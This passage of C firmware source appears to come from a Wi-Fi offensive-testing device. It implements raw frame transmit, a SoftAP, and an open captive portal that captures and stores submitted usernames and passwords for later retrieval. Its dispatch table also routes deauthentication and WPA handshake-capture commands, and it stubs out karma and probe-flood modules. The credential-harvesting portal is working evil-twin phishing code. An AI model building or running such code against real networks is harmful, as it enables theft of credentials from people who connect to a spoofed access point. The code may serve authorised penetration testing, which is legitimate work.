             * performed based on arbiter TOKEN ownership rather than solely on
             * winning the op-table claim (see those handlers' own doc comments),
             * specifically so the forced timeout finalization below can never
             * orphan the arbiter or permit unsafe overlapping radio work.
             *
             * If the bounded wait expires, the worker's own blocking
             * ap_scan/sta_scan HAL call may still genuinely be running -- but
             * the TOKEN itself must not be left queryable/RUNNING as a live "old
             * session" operation (it would otherwise survive the coming
             * mtk_op_evict_all_terminal sweep untouched, indefinitely answerable
             * to a new peer session's own STATUS/STOP calls against the same
             * token number). Force-claim and transition it to a terminal state
             * right now so it becomes immediately evictable -- deliberately
             * WITHOUT touching the arbiter class, which must stay held exactly
             * as long as the radio is genuinely busy. When the worker's own
             * blocking call eventually returns, it will lose this same claim
             * (mtk_op_ claim_finalization returns false for it) and correctly
             * skip publishing any state/event into the new session, while STILL
             * performing the real restore/release once it observes (via arbiter
             * token ownership) that it is safe to do so.
             *
             * This logic is now the single shared wifi_quiesce_and_fence_ws
             * helper, also used by handle_wifi_stop_all's own WS branch, so the
             * two can never independently drift. */
            wifi_quiesce_and_fence_ws(tok, epoch);
            break;
        }
        default:
            return id;
    }
    id.token = tok; id.boot_epoch = epoch;
    return id;
}

static void handle_get_wifi_recovery_state(mtk_request_ctx_t *ctx) {
    mtk_get_wifi_recovery_state_resp_t r;
    /* M3 correction (independent review P1 "GET_WIFI_RECOVERY_STATE still
     * constructs a torn response"): the previous fix already made
     * active_operation_count/sta_mode_restored coherent with each other via one
     * snapshot, but radio_owner still came from a SEPARATE, independently-locked
     * mtk_arbiter_active_owner call taken before that snapshot -- a concurrent
     * ownership transition between the two could still produce a radio_owner
     * that disagrees with the other two fields. All three now come from the SAME
     * single snapshot: radio_ owner via the pure
     * mtk_arbiter_owner_for_class(snap.cls) mapping (no second lock acquisition,
     * no second read of shared arbiter state), never a second active-state read. */
    mtk_arbiter_snapshot_t snap = mtk_arbiter_snapshot();
    r.radio_owner = (uint8_t)mtk_arbiter_owner_for_class(snap.cls);
    r.active_operation_count = (snap.cls == MTK_ARB_NONE) ? 0 : 1;
    r.sta_mode_restored = (snap.cls == MTK_ARB_NONE) ? 1 : 0;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_get_wifi_recovery_state_resp_t_desc);
}

static void handle_wifi_mode_get(mtk_request_ctx_t *ctx) {
    uint8_t mode = s_soft_mode_baseline;
    if (s_hal && s_hal->get_mode) s_hal->get_mode(&mode);
    mtk_wifi_mode_get_resp_t r; r.baseline_mode = mode; r.effective_mode = mode;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_wifi_mode_get_resp_t_desc);
}

static void handle_wifi_mode_set(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                  const uint8_t *req_bytes, size_t req_len) {
    /* Capability-gated DISABLED-by-default in the universal artifact
     * (lab_controls_policy); the router already rejects this at the
     * capability layer via mtk_router's cap_native lookup when the schema
     * marks it DISABLED for this build, so reaching here means a lab-
     * enabled native build. */
    mtk_wifi_mode_set_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    uint8_t prev = s_soft_mode_baseline;
    if (s_hal && s_hal->get_mode) s_hal->get_mode(&prev);
    int rc = s_hal && s_hal->set_mode ? s_hal->set_mode(req.mode) : -1;
    if (rc != 0) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
    s_soft_mode_baseline = req.mode;
    mtk_wifi_mode_set_resp_t r; r.previous_mode = prev; r.applied_mode = req.mode;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_wifi_mode_set_resp_t_desc);
}

static void handle_wifi_mac_get(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                 const uint8_t *req_bytes, size_t req_len) {
    mtk_wifi_mac_get_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_hal_mac6_t mac = {0};
    if (s_hal && s_hal->get_mac) s_hal->get_mac(&mac);
    mtk_wifi_mac_get_resp_t r; r.mac = from_hal_mac(mac);
    respond(ctx, MTK_STATUS_OK, &r, &mtk_wifi_mac_get_resp_t_desc);
}

static void handle_raw_tx_send(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                const uint8_t *req_bytes, size_t req_len) {
    mtk_raw_tx_send_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    if (req.frame.len < MTK_BUDGET_RAW_TX_FRAME_MIN_BYTES || req.frame.len > MTK_BUDGET_RAW_TX_FRAME_MAX_BYTES) {
        respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return;
    }
    if (req.channel < 1 || req.channel > 13) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
    mtk_arbiter_grant_t g = mtk_arbiter_acquire(MTK_ARB_RAW, 0);
    if (g != MTK_ARB_GRANT_OK) { respond_empty(ctx, MTK_STATUS_BUSY); return; }
    /* "Current raw TX validates the requested channel but does not select it."
     * req.channel was previously decoded and range-checked, then never used at
     * all -- the frame transmitted on whatever channel the radio already
     * happened to be on. Selected and VERIFIED here before transmit; never
     * transmits on a channel selection failure. */
    int chan_rc = s_hal && s_hal->set_channel ? s_hal->set_channel(req.channel) : -1;
    /* Owner-approved correction (docs/DECISION_LOG.md's RC11 "discovered,
     * not fixed" note): set_channel's own successful call already ran
     * capture_prior_state_once (mtek_wifi_hal_esp32.c), capturing a real
     * prior-state snapshot that nothing here ever cleared -- a raw
     * mtk_arbiter_release left that snapshot permanently un-cleared, so a
     * LATER, unrelated session's own capture_prior_state_once call would
     * silently reuse this stale snapshot instead of capturing the real
     * current state. Both exit paths now go through the shared restore-
     * and-release wrapper instead. */
    /* RAW_TX mints no operation token of its own (mtk_arbiter_acquire was
     * called with token 0 above) -- 0 is the exact token this class was
     * acquired under, so it is also the correct value to pass through to
     * the shared restore-and-release wrapper's own atomic ownership
     * check. */
    if (chan_rc != 0) { mtek_wifi_restore_and_release(MTK_ARB_RAW, 0); respond_empty(ctx, MTK_STATUS_IO_ERROR); return; }
    int rc = s_hal && s_hal->raw_tx ? s_hal->raw_tx(req.frame.data, req.frame.len) : -1;
    int restore_rc = mtek_wifi_restore_and_release(MTK_ARB_RAW, 0);
    respond_empty(ctx, (rc == 0 && restore_rc == 0) ? MTK_STATUS_OK : MTK_STATUS_IO_ERROR);
}

/* SoftAP (service 0x0001, opcodes 0x0019-0x001B) --------------------
 *
 * A general reusable platform capability rather than a community-specific
 * module: a station-mode radio can always be put into AP mode. The captive
 * portal layers DNS/HTTP over this same interface instead of bringing up a
 * second one, so the AP lifecycle lives here, once.
 *
 * Ownership follows the same shape every other long-lived radio operation in
 * this file uses: one operation token, one MTK_ARB_SAP lease held for as long
 * as the AP is serving, and a single teardown path (softap_teardown) that
 * every exit -- user STOP, start failure, peer reset -- funnels through.
 *
 * The passphrase is treated as a secret: it is copied out of the decoded
 * request into a local only for the HAL call, and both that local and the
 * decoded request are zeroized immediately afterwards. It is never stored in
 * the session record, so no later read of s_sap can disclose it. */
#define SOFTAP_START_OPCODE 0x0019

static struct {
    uint32_t token;
    uint32_t boot_epoch;
    uint32_t session_generation;
    mtk_sink_t sink;
    uint8_t active;
    uint8_t channel;
    uint8_t kind;   /* 0 = plain SoftAP, 1 = captive portal */
} s_sap;

static void softap_teardown(uint32_t token, uint32_t boot_epoch, uint8_t status) {
    if (!mtk_op_claim_finalization(token, boot_epoch)) return; /* lost the race: the winner already did this */
    /* Snapshot before releasing the lease, for the same reason handshake_finish
     * does: once MTK_ARB_SAP is free a brand-new SOFTAP_START can reinitialize
     * s_sap, and a later read here would report this token while carrying the
     * new session's sink. */
    wifi_lock();
    mtk_sink_t sink = s_sap.sink;
    uint32_t session_generation = s_sap.session_generation;
    uint8_t kind = s_sap.kind;
    s_sap.active = 0;
    wifi_unlock();

    /* Both are always called, including when nothing came up: a failed start
     * must still leave nothing serving. The portal runtime is stopped before
     * the interface it runs on. */
    if (kind == 1 && s_hal && s_hal->portal_stop) s_hal->portal_stop();
    if (s_hal && s_hal->softap_stop) s_hal->softap_stop();
    int restore_rc = mtek_wifi_restore_and_release(MTK_ARB_SAP, token);
    uint8_t final_status = (restore_rc == 0) ? status : MTK_STATUS_IO_ERROR;
    mtk_op_transition_by_token(token, boot_epoch, MTK_OPS_STOPPED, final_status, now_ms());
    if (mtk_op_begin_publish_guard(session_generation)) {
        if (kind == 1) {
            mtk_captive_portal_stopped_ev_t ev = {0};
            ev.operation_token = token;
            ev.status = final_status;
            sink.emit_event(sink.user, token, "CAPTIVE_PORTAL_STOPPED", &ev,
                            &mtk_captive_portal_stopped_ev_t_desc);
        } else {
            mtk_softap_stopped_ev_t ev = {0};
            ev.operation_token = token;
            ev.status = final_status;
            sink.emit_event(sink.user, token, "SOFTAP_STOPPED", &ev, &mtk_softap_stopped_ev_t_desc);
        }
        mtk_op_end_publish_guard();
    }
}

static void handle_softap_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                 const uint8_t *req_bytes, size_t req_len) {
    mtk_softap_start_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        memset(&req, 0, sizeof(req));
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    /* Validated before any resource is acquired, so a rejected request leaves
     * the radio untouched. A WPA2 passphrase is 8..63 characters; 0 means an
     * open network. Anything else cannot be configured and is refused rather
     * than silently downgraded to open, which would be a security surprise. */
    uint8_t ssid_len = (uint8_t)req.config.ssid.len;
    uint8_t psk_len = (uint8_t)req.config.psk.len;
    if (ssid_len == 0 || ssid_len > 32 ||
        (psk_len != 0 && (psk_len < 8 || psk_len > 63)) ||
        req.config.channel < 1 || req.config.channel > 13) {
        memset(&req, 0, sizeof(req));
        respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return;
    }

    if (!mtk_op_begin_admission_guard(ctx->session_generation)) {
        memset(&req, 0, sizeof(req));
        respond_empty(ctx, MTK_STATUS_NOT_READY); return;
    }
    int no_mem = 0;
    mtk_op_id_t id = mtk_op_alloc_id(op->service_id, op->opcode, now_ms(), &no_mem);
    if (id.token == 0) {
        memset(&req, 0, sizeof(req));
        respond_empty(ctx, MTK_STATUS_NO_MEMORY);
        mtk_op_end_admission_guard();
        return;
    }
    if (mtk_arbiter_acquire(MTK_ARB_SAP, id.token) != MTK_ARB_GRANT_OK) {
        mtk_op_discard_unpublished(id.token, id.boot_epoch);
        memset(&req, 0, sizeof(req));
        respond_empty(ctx, MTK_STATUS_BUSY);
        mtk_op_end_admission_guard();
        return;
    }
    mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_RUNNING, MTK_STATUS_OK, now_ms());

    wifi_lock();
    memset(&s_sap, 0, sizeof(s_sap));
    s_sap.token = id.token; s_sap.boot_epoch = id.boot_epoch;
    s_sap.session_generation = ctx->session_generation;
    s_sap.sink = ctx->sink;
    s_sap.channel = req.config.channel;
    s_sap.active = 1;
    wifi_unlock();

    mtk_softap_start_resp_t r; r.operation_token = id.token;
    respond(ctx, MTK_STATUS_ACCEPTED, &r, &mtk_softap_start_resp_t_desc);
    mtk_op_end_admission_guard();

    /* The passphrase reaches the HAL through this local only, and neither copy
     * outlives the call. */
    uint8_t psk_local[64];
    memset(psk_local, 0, sizeof(psk_local));
    if (psk_len) memcpy(psk_local, req.config.psk.data, psk_len);
    uint8_t channel = req.config.channel;
    uint8_t ssid_local[32];
    memset(ssid_local, 0, sizeof(ssid_local));
    memcpy(ssid_local, req.config.ssid.data, ssid_len);
    memset(&req, 0, sizeof(req));
    int rc = (s_hal && s_hal->softap_start)
             ? s_hal->softap_start(ssid_local, ssid_len, psk_local, psk_len, channel)
             : -1;
    memset(psk_local, 0, sizeof(psk_local));

    if (rc != 0) {
        /* The ACCEPTED response is already on the wire (an ACCEPTED_ASYNC
         * operation's established shape), so the failure is reported as a
         * terminal event rather than retroactively changing that status --
         * never left RUNNING with nothing actually serving. */
        softap_teardown(id.token, id.boot_epoch, MTK_STATUS_IO_ERROR);
        return;
    }
    if (mtk_op_begin_publish_guard(ctx->session_generation)) {
        mtk_softap_ready_ev_t ev = {0};
        ev.operation_token = id.token;
        ev.actual_channel = channel;
        ctx->sink.emit_event(ctx->sink.user, id.token, "SOFTAP_READY", &ev, &mtk_softap_ready_ev_t_desc);
        mtk_op_end_publish_guard();
    }
}

static void handle_softap_stop(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                const uint8_t *req_bytes, size_t req_len) {
    mtk_softap_stop_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t precheck;
    /* Family gate: a token this service did not mint from SOFTAP_START can
     * never finalize a foreign operation or release its arbiter class. */
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, SOFTAP_START_OPCODE, &precheck)) {
        respond_empty(ctx, MTK_STATUS_NOT_FOUND); return;
    }
    softap_teardown(req.operation_token, ctx->boot_epoch, MTK_STATUS_OK);
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, SOFTAP_START_OPCODE, &snap)) {
        respond_empty(ctx, MTK_STATUS_NOT_FOUND); return;
    }
    mtk_softap_stop_resp_t r;
    r.final_state = (uint8_t)snap.state;
    r.final_status = snap.final_status;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_softap_stop_resp_t_desc);
}

static void handle_softap_sta_list(mtk_request_ctx_t *ctx) {
    mtk_softap_sta_list_resp_t r; memset(&r, 0, sizeof(r));
    wifi_lock();
    uint8_t active = s_sap.active;
    wifi_unlock();
    r.active = active;
    uint8_t count = 0;
    /* An unknown count is reported as zero rather than guessed; the HAL logs
     * its own failure. */
    if (active && s_hal && s_hal->softap_sta_count && s_hal->softap_sta_count(&count) != 0) count = 0;
    r.connected_station_count = active ? count : 0;
    /* No routed uplink is implemented, so this is unconditionally false rather
     * than an unverified claim. */
    r.internet_shared = 0;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_softap_sta_list_resp_t_desc);
}

/* Captive portal (service 0x0001, opcodes 0x0022-0x0025) ---------------
 *
 * Layered on the SoftAP above rather than beside it: a portal session brings
 * up the same AP interface, holds the same MTK_ARB_SAP lease, and finalizes
 * through the same softap_teardown path. s_sap.kind records which of the two
 * a given session is, so the teardown emits the correct terminal event
 * without duplicating any lifecycle logic.
 *
 * Captured credentials deliberately OUTLIVE an ordinary stop -- the whole
 * point of the feature is to retrieve them after the portal is taken down --
 * and are zeroized on reset, and whenever a new portal session starts, so one
 * engagement's captures can never be attributed to the next.
 *
 * Memory: the credential store IS the generated response object
 * (mtk_captive_portal_get_credentials_resp_t, 32 entries x 255-byte
 * username/password fields, ~16.6KB). It is file-static, never a task-stack
 * local: materializing it in a request handler's own frame would exceed the
 * 12,288-byte transport task stacks this project budgets for. */
#define CAPTIVE_PORTAL_START_OPCODE 0x0022

static mtk_captive_portal_get_credentials_resp_t s_portal_creds;
static struct {
    uint32_t dns_queries;
    uint32_t http_hits;
    uint8_t last_post_body[95];
    uint8_t last_post_len;
} s_portal_diag;

/* Zeroized rather than merely reset to count=0: a captured passphrase must not
 * remain readable in DIRAM after the session that captured it is gone. */
static void portal_credentials_zeroize(void) {
    memset(&s_portal_creds, 0, sizeof(s_portal_creds));
    memset(&s_portal_diag, 0, sizeof(s_portal_diag));
}

/* Called by the HAL for each submission. Bounded: once the store is full the
 * oldest entries are kept and later submissions are counted but dropped,
 * rather than growing without limit or overwriting the earliest evidence. */
static void portal_cred_cb(void *user, const uint8_t *username, uint8_t username_len,
                            const uint8_t *password, uint8_t password_len) {
    (void)user;
    wifi_lock();
    if (s_portal_creds.credentials.count < 32) {
        unsigned i = s_portal_creds.credentials.count;
        s_portal_creds.credentials.items[i].captured_at_epoch_s = (uint32_t)(now_ms() / 1000u);
        /* Both wire fields hold 255 bytes and both lengths are uint8_t, so a
         * submission can never overrun them; no clamp is reachable here. */
        uint16_t ulen = username_len;
        uint16_t plen = password_len;
        s_portal_creds.credentials.items[i].username.len = ulen;
        if (ulen) memcpy(s_portal_creds.credentials.items[i].username.data, username, ulen);
        s_portal_creds.credentials.items[i].password.len = plen;
        if (plen) memcpy(s_portal_creds.credentials.items[i].password.data, password, plen);
        s_portal_creds.credentials.count++;
    }
    wifi_unlock();
}

static void handle_captive_portal_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                         const uint8_t *req_bytes, size_t req_len) {
    mtk_captive_portal_start_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) {
        respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return;
    }
    uint8_t ssid_len = (uint8_t)req.ssid.len;
    uint8_t title_len = (uint8_t)req.portal_title.len;
    if (ssid_len == 0 || ssid_len > 32 || title_len > 95 ||
        req.channel < 1 || req.channel > 13) {
        respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return;
    }

    if (!mtk_op_begin_admission_guard(ctx->session_generation)) { respond_empty(ctx, MTK_STATUS_NOT_READY); return; }
    int no_mem = 0;
    mtk_op_id_t id = mtk_op_alloc_id(op->service_id, op->opcode, now_ms(), &no_mem);
    if (id.token == 0) { respond_empty(ctx, MTK_STATUS_NO_MEMORY); mtk_op_end_admission_guard(); return; }
    if (mtk_arbiter_acquire(MTK_ARB_SAP, id.token) != MTK_ARB_GRANT_OK) {
        mtk_op_discard_unpublished(id.token, id.boot_epoch);
        respond_empty(ctx, MTK_STATUS_BUSY);
        mtk_op_end_admission_guard();
        return;
    }
    mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_RUNNING, MTK_STATUS_OK, now_ms());

    wifi_lock();
    memset(&s_sap, 0, sizeof(s_sap));
    s_sap.token = id.token; s_sap.boot_epoch = id.boot_epoch;
    s_sap.session_generation = ctx->session_generation;
    s_sap.sink = ctx->sink;
    s_sap.channel = req.channel;
    s_sap.active = 1;
    s_sap.kind = 1; /* portal: teardown emits CAPTIVE_PORTAL_STOPPED */
    wifi_unlock();
    /* A new engagement never inherits the previous one's captures. */
    portal_credentials_zeroize();

    mtk_captive_portal_start_resp_t r; r.operation_token = id.token;
    respond(ctx, MTK_STATUS_ACCEPTED, &r, &mtk_captive_portal_start_resp_t_desc);
    mtk_op_end_admission_guard();

    /* A captive portal is an OPEN network by construction -- a client that
     * must already know a passphrase cannot be steered to a sign-in page. */
    uint8_t channel = req.channel;
    int rc = (s_hal && s_hal->softap_start)
             ? s_hal->softap_start(req.ssid.data, ssid_len, NULL, 0, channel)
             : -1;
    if (rc == 0) {
        rc = (s_hal && s_hal->portal_start)
             ? s_hal->portal_start(req.portal_title.data, title_len, portal_cred_cb, NULL)
             : -1;
        /* The AP is up but the portal is not: tear the whole session down
         * rather than leave an open network with no sign-in page, which would
         * be an unannounced open AP. */
        if (rc != 0 && s_hal && s_hal->portal_stop) s_hal->portal_stop();
    }
    memset(&req, 0, sizeof(req));

    if (rc != 0) {
        softap_teardown(id.token, id.boot_epoch, MTK_STATUS_IO_ERROR);
        return;
    }
    if (mtk_op_begin_publish_guard(ctx->session_generation)) {
        mtk_captive_portal_ready_ev_t ev = {0};
        ev.operation_token = id.token;
        ev.actual_channel = channel;
        ctx->sink.emit_event(ctx->sink.user, id.token, "CAPTIVE_PORTAL_READY", &ev,
                             &mtk_captive_portal_ready_ev_t_desc);
        mtk_op_end_publish_guard();
    }
}

static void handle_captive_portal_stop(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                        const uint8_t *req_bytes, size_t req_len) {
    mtk_captive_portal_stop_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t precheck;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, CAPTIVE_PORTAL_START_OPCODE, &precheck)) {
        respond_empty(ctx, MTK_STATUS_NOT_FOUND); return;
    }
    softap_teardown(req.operation_token, ctx->boot_epoch, MTK_STATUS_OK);
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, CAPTIVE_PORTAL_START_OPCODE, &snap)) {
        respond_empty(ctx, MTK_STATUS_NOT_FOUND); return;
    }
    /* Credentials deliberately survive this stop and stay retrievable until a
     * reset or the next portal session. */
    mtk_captive_portal_stop_resp_t r;
    r.final_state = (uint8_t)snap.state;
    r.final_status = snap.final_status;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_captive_portal_stop_resp_t_desc);
}

static void handle_captive_portal_get_credentials(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                                   const uint8_t *req_bytes, size_t req_len) {
    mtk_captive_portal_get_credentials_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    /* The store is also the response object (see this section's own memory
     * note), so the caller's max_count is applied by temporarily narrowing the
     * advertised count and restoring it afterwards -- never by copying ~16.6KB
     * onto a task stack. */
    wifi_lock();
    uint32_t full = s_portal_creds.credentials.count;
    uint32_t limited = (req.max_count && req.max_count < full) ? req.max_count : full;
    s_portal_creds.credentials.count = limited;
    wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &s_portal_creds, &mtk_captive_portal_get_credentials_resp_t_desc);
    wifi_lock();
    s_portal_creds.credentials.count = full;
    wifi_unlock();
}

static void handle_captive_portal_get_diagnostics(mtk_request_ctx_t *ctx) {
    mtk_captive_portal_get_diagnostics_resp_t r; memset(&r, 0, sizeof(r));
    uint32_t dns = 0, http = 0;
    uint8_t body[95]; uint8_t body_len = 0;
    memset(body, 0, sizeof(body));
    /* Unknown counters report zero rather than a stale or invented value. */
    if (s_hal && s_hal->portal_stats && s_hal->portal_stats(&dns, &http, body, &body_len) != 0) {
        dns = 0; http = 0; body_len = 0;
    }
    if (body_len > 95) body_len = 95;
    r.dns_queries = dns;
    r.http_hits = http;
    r.last_post_body.len = body_len;
    if (body_len) memcpy(r.last_post_body.data, body, body_len);

    uint8_t count = 0;
    wifi_lock();
    uint8_t active = s_sap.active;
    wifi_unlock();
    if (active && s_hal && s_hal->softap_sta_count && s_hal->softap_sta_count(&count) != 0) count = 0;
    r.connected_clients = active ? count : 0;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_captive_portal_get_diagnostics_resp_t_desc);
}

/* Dispatch ----------------------------- */

static void mtek_wifi_dispatch(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                const uint8_t *req_bytes, size_t req_len) {
    switch (op->opcode) {
        case 0x0001: handle_ap_scan_start(ctx, op, req_bytes, req_len); return;
        case 0x0002: handle_ap_scan_status(ctx, op, req_bytes, req_len); return;
        case 0x0003: handle_ap_scan_results_page(ctx, op, req_bytes, req_len); return;
        case 0x0004: handle_ap_scan_stop(ctx, op, req_bytes, req_len); return;
        case 0x0005: handle_ap_details(ctx, op, req_bytes, req_len); return;
        case 0x0006: handle_sta_scan_start(ctx, op, req_bytes, req_len); return;
        case 0x0007: handle_sta_scan_status(ctx, op, req_bytes, req_len); return;
        case 0x0008: handle_sta_scan_results_page(ctx, op, req_bytes, req_len); return;
        case 0x0009: handle_sta_scan_stop(ctx, op, req_bytes, req_len); return;
        case 0x000A: handle_sta_connect(ctx, op, req_bytes, req_len); return;
        case 0x000B: handle_sta_disconnect(ctx); return;
        case 0x000C: handle_sta_status(ctx); return;
        case 0x0010: handle_deauth_start(ctx, op, req_bytes, req_len); return;
        case 0x0011: handle_deauth_stop(ctx, op, req_bytes, req_len); return;
        case 0x0012: handle_deauth_status(ctx, op, req_bytes, req_len); return;
        case 0x0013: handle_handshake_start(ctx, op, req_bytes, req_len); return;
        case 0x0014: handle_handshake_status(ctx, op, req_bytes, req_len); return;
        case 0x0015: handle_handshake_read(ctx, op, req_bytes, req_len); return;
        case 0x0016: handle_handshake_stop(ctx, op, req_bytes, req_len); return;
        case 0x0017: handle_wifi_stop_all(ctx); return;
        case 0x0018: handle_get_wifi_recovery_state(ctx); return;
        case 0x0019: handle_softap_start(ctx, op, req_bytes, req_len); return;
        case 0x001A: handle_softap_stop(ctx, op, req_bytes, req_len); return;
        case 0x001B: handle_softap_sta_list(ctx); return;
        case 0x0021: handle_raw_tx_send(ctx, op, req_bytes, req_len); return;
        case 0x0027: handle_wifi_mode_get(ctx); return;
        case 0x0028: handle_wifi_mode_set(ctx, op, req_bytes, req_len); return;
        case 0x0029: handle_wifi_mac_get(ctx, op, req_bytes, req_len); return;
        /* Optional capability modules (docs/ARCHITECTURE.md's module
         * boundary): legacy-protocol attack conveniences, not shipped
         * List A / required-List B canonical-core contracts. Each has
         * its own compile-time Kconfig gate (main/Kconfig.projbuild);
         * radio-behavior logic for all four is not implemented yet this
         * session regardless of the gate (docs/PROVENANCE.md) -- the
         * explicit case labels below (present only when the module is
         * compiled in) exist so the capability manifest can honestly
         * distinguish "module compiled out" from "module compiled in,
         * not yet implemented", both of which currently answer the same
         * wire status (UNSUPPORTED, no side effect) that a DISABLED
         * capability would. */
#if CONFIG_MTEK_MODULE_BEACON_VARIANTS
        case 0x000D: case 0x000E: case 0x000F: respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return; /* BEACON_START/STOP/STATUS */
#endif
#if CONFIG_MTEK_MODULE_PROBE_FLOOD
        case 0x001C: case 0x001D: respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return; /* PROBE_FLOOD_START/STOP */
#endif
#if CONFIG_MTEK_MODULE_KARMA
        case 0x001F: case 0x0020: respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return; /* KARMA_START/STOP */
#endif
#if CONFIG_MTEK_MODULE_CAPTIVE_PORTAL
        case 0x0022: handle_captive_portal_start(ctx, op, req_bytes, req_len); return;
        case 0x0023: handle_captive_portal_stop(ctx, op, req_bytes, req_len); return;
        case 0x0024: handle_captive_portal_get_credentials(ctx, op, req_bytes, req_len); return;
        case 0x0025: handle_captive_portal_get_diagnostics(ctx); return;
#endif
        /* PMKID_CAPTURE (0x001E/0x0026) has no Legacy SPI Compatibility
         * mapping at all per the accepted contract and is not module-gated.
         * It, and anything else reaching this point, is not implemented --
         * see docs/PROVENANCE.md. Returns the same wire status a DISABLED
         * capability would (no side effect). SoftAP (0x0019-0x001B) is
         * handled above: it is implemented as a general reusable platform
         * capability in canonical core, not a module (docs/ARCHITECTURE.md). */
        default: respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return;
    }
}

mtk_register_result_t mtek_wifi_service_register(void) {
    return mtk_router_register(0x0001, mtek_wifi_dispatch);
}
